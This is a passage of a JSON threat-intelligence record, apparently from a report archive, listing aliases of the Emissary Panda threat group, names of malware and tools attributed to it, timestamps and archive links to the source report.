                "Earth Smilodon",
                "Emissary Panda",
                "Group 35",
                "Iron Taurus",
                "Iron Tiger",
                "LuckyMouse",
                "Operation DRBControl",
                "Operation Iron Tiger",
                "Operation PZChao",
                "Operation SpoiledLegacy",
                "Operation StealthyTrident",
                "Red Phoenix",
                "TEMP.Hippo",
                "TG-3390",
                "ZipToken"
            ],
            "source_name": "ETDA:Emissary Panda",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Agent.dhwf",
                "AngryRebel",
                "Antak",
                "CHINACHOPPER",
                "China Chopper",
                "Destroy RAT",
                "DestroyRAT",
                "FOCUSFJORD",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HTTPBrowser",
                "HTran",
                "HUC Packet Transmit Tool",
                "HighShell",
                "HttpBrowser RAT",
                "HttpDump",
                "HyperBro",
                "HyperSSL",
                "HyperShell",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "Nishang",
                "OwaAuth",
                "PCRat",
                "PlugX",
                "ProcDump",
                "PsExec",
                "RedDelta",
                "SEASHARPEE",
                "Sensocode",
                "SinoChopper",
                "Sogu",
                "SysUpdate",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Token Control",
                "TokenControl",
                "TwoFace",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Xamtrav",
                "ZXShell",
                "gsecdump",
                "luckyowa"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535663,
    "ts_updated_at": 1743041745,
    "ts_creation_date": 1660794213,
    "ts_modification_date": 1660794213,
    "files": {
        "pdf": "https://archive.orkl.eu/966243ed23d2ed6443e3e87b51e74cf2474d3e8d.pdf",
        "text": "https://archive.orkl.eu/966243ed23d2ed6443e3e87b51e74cf2474d3e8d.txt",
        "img": "https://archive.orkl.eu/966243ed23d2ed6443e3e87b51e74cf2474d3e8d.jpg"
    }
}